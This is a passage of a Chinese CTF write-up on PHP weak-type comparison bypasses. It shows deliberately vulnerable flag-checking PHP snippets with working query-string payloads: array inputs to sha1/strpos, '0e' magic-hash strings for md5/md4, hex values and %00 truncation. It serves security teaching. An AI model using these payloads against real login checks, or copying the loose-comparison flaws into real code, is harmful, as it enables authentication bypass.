src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="6-弱类型整数大小比较绕过"><a href="#6-弱类型整数大小比较绕过" class="headerlink" title="6. 弱类型整数大小比较绕过"></a>6. 弱类型整数大小比较绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">1336</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>is_numeric()</td><td>判断变量是否为数字或数字字符串</td></tr></tbody></table><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL，可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">2000</span>a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="7-sha-函数比较绕过"><a href="#7-sha-函数比较绕过" class="headerlink" title="7. sha()函数比较绕过"></a>7. sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php">http://123.206.87.240:9009/7.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  &quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your password can not be your name!&#x27;</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password.&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Login first!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="8-md5加密相等绕过"><a href="#8-md5加密相等绕过" class="headerlink" title="8. md5加密相等绕过"></a>8. md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php">http://123.206.87.240:9009/13.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&#x27;QNKCDZO&#x27;);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(isset($a)) &#123;</span><br><span class="line">if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo <span class="string">&quot;flag&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，然后我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?a=s878926199a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>原理：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，</p><p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>以下字符串，md5哈希值都是0e开头的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><h2 id="9-十六进制与数字比较"><a href="#9-十六进制与数字比较" class="headerlink" title="9. 十六进制与数字比较"></a>9. 十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php">http://123.206.87.240:9009/20.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function">function <span class="title">noother_says_correct</span><span class="params">($temp)</span> </span>&#123;</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">$one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = &#x27;3735929054&#x27;;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($number); $i++) &#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp &#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;flase&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&#x27;password&#x27;];</span><br><span class="line"><span class="function">echo <span class="title">noother_says_correct</span><span class="params">($temp)</span></span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">0xdeadc0de</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="10-ereg正则-00截断"><a href="#10-ereg正则-00截断" class="headerlink" title="10. ereg正则%00截断"></a>10. ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;</span><br><span class="line">echo &#x27;You password must be alphanumeric&#x27;;</span><br><span class="line">&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;</span><br><span class="line">if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;</span><br><span class="line">die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo(&#x27;have not been found&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo &#x27;Invalid password&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”<em>-</em>“才能输出flag。</p><p>可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1e8</span>%<span class="number">00</span>*-*</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="11-strpos数组绕过"><a href="#11-strpos数组绕过" class="headerlink" title="11. strpos数组绕过"></a>11. strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php">http://123.206.87.240:9009/15.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;ctf&#x27;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)</span><br><span class="line">     echo &#x27;必须输入数字才行&#x27;; </span><br><span class="line">else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)</span><br><span class="line">     die(&#x27;Flag: &#x27;.$flag); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">     echo &#x27;骚年，继续努力吧啊~&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求传入的参数为数字并且包含字符串“#biubiubiu”，有点难搞。</p><p>可以通过数组绕过<code>strpos</code>与<code>ereg</code>函数，遇到数组返回NULL，数值和类型相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="12-数字验证正则绕过"><a href="#12-数字验证正则绕过" class="headerlink" title="12. 数字验证正则绕过"></a>12. 数字验证正则绕过</h2><p><a href="http://123.206.87.240:9009/21.php">http://123.206.87.240:9009/21.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 &#123;</span><br><span class="line">echo &#x27;flag&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);</span><br><span class="line"><span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line">foreach ($ps as $pt) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[[:$pt:]]+/&quot;</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == $password) </span><br><span class="line">              echo $flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">              echo &#x27;Wrong password&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码中涉及到的一些正则函数<br>| 正则匹配函数   | 描述                                                         | 区别                       |<br>| ————– | ———————————————————— | ————————– |<br>| preg_match     | 执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0       | 第一次匹配成功后就停止匹配 |<br>| preg_match_all | 执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 | 匹配到字符串结束为止       |</p><p>下面还有几个正则匹配的字符：<br>| 正则匹配字符  | 描述 |ASCII|<br>|–|–|–|<br>| [:graph:] |除空格，TAB外的所有字符 |[\x21-\x7E]<br>|[a-zA-Z0-9]|大小写字母和数字 |[a-zA-Z0-9]<br>|[:alpha:]|大小写字母|    [a-zA-Z]|<br>| [:punct:] | 任何标点符号|[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]|<br>| [:digit:] |任何数字 |[0-9]<br>| [:upper:] |任何大写字母 |[A-Z]<br>| [:lower:] |任何小写字母 |[a-z]</p><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求方法必须为POST</span><br><span class="line"><span class="number">1</span>、正则匹配，[:graph:]为任意字符，要求password长度超过<span class="number">12</span></span><br><span class="line"><span class="number">2</span>、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过<span class="number">6</span>次</span><br><span class="line"><span class="number">3</span>、标点符号，数字，大写字母，小写字母，包含<span class="number">3</span>种以上绕过</span><br><span class="line"><span class="number">4</span>、弱类型比较，42abc,强制转换为数字</span><br></pre></td></tr></table></figure><p>构造Payload，居然提示<code>Wrong password</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: password=42BugKuctf.a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>仔细看了一下代码，变量原来是flag，改一下Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: flag=42BugKuctf.a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这道题有点奇怪，随便post一个值也能得到flag，小小脑袋有大大疑问。<br><img src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="13-md4绕过"><a href="#13-md4绕过" class="headerlink" title="13.md4绕过"></a>13.md4绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Theshy is locked&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中get进来的参数a，使<code>a=md4(a)</code>才行。</p><p>百度一下md4绕过，发现可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payload为：</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="number">0e251288019</span></span><br><span class="line">或</span><br><span class="line">?a=<span class="number">0e001233333333333334557778889</span></span><br></pre></td></tr></table></figure><h2 id="14-json绕过"><a href="#14-json绕过" class="headerlink" title="14.json绕过"></a>14.json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 